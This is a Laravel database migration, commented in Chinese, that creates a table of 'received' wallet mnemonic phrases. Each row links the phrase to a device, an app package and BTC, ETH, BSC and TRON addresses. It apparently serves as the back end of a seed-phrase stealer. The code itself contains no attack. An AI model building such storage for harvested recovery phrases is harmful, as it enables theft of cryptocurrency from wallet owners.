<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;

return new class extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('receive_words', function (Blueprint $table) {
            $table->id()->comment('主键ID');
            $table->unsignedBigInteger('device_id')->nullable()->comment('设备ID');
            $table->string('device_number', 100)->nullable()->comment('设备号');
            $table->string('app_name', 200)->nullable()->comment('APP名称');
            $table->string('app_package', 200)->nullable()->comment('APP包名');
            $table->text('words')->nullable()->comment('助记词');
            $table->string('wallet_address_btc', 200)->nullable()->comment('钱包地址BTC');
            $table->string('wallet_address_eth', 200)->nullable()->comment('钱包地址ETH');
            $table->string('wallet_address_bsc', 200)->nullable()->comment('钱包地址BSC');
            $table->string('wallet_address_tron', 200)->nullable()->comment('钱包地址TRON');

            $table->timestamps();
            $table->engine = 'InnoDB';
        });
    
        DB::statement("ALTER TABLE `receive_words` COMMENT = '收信助记词表'");
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('receive_words');
    }
};

